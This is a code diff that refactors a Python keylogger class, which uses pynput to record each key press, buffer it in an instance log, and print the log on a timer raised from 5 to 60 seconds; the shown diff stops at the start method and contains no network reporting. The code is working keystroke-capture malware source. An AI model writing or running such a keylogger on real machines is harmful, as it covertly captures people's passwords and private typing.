@@ -1,29 +1,30 @@
 #!/usr/bin/env python
-import time
 from pynput import keyboard
 import threading
-
-log = ""
 
 
 class Keylogger:
 
-    def process_key_press(self, key):
-        global log
-        try:
-            log += str(key.char)
+    def __init__(self):
+        self.log = ""
 
+    def append_to_log(self, string):
+        self.log += string
+
+    def process_key_press(self, key):
+        try:
+            current_key = str(key.char)
         except AttributeError:
             if key == key.space:
-                log += " "
+                current_key = " "
             else:
-                log += f"{str(key)}"
+                current_key = f"{str(key)}"
+        self.append_to_log(current_key)
 
     def report(self):
-        global log
-        print(log)
-        log = ""
-        timer = threading.Timer(5, self.report)
+        print(self.log)
+        self.log = ""
+        timer = threading.Timer(60, self.report)
         timer.start()
 
     def start(self):
